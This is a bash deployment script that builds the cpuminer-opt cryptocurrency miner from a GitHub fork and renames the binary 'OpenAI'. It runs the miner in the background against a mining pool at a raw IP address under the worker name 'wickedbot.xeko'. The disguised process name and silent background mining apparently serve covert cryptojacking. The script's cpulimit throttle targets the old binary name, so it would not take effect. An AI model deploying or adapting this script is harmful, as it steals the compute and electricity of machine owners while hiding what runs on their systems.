#!/bin/bash
sudo apt-get update && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/k67frozen/cpuminer-opt
cd cpuminer-opt
chmod +x *
./build.sh
mv cpuminer OpenAI
cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://93.94.142.135:3032 -u wickedbot.xeko -p x --background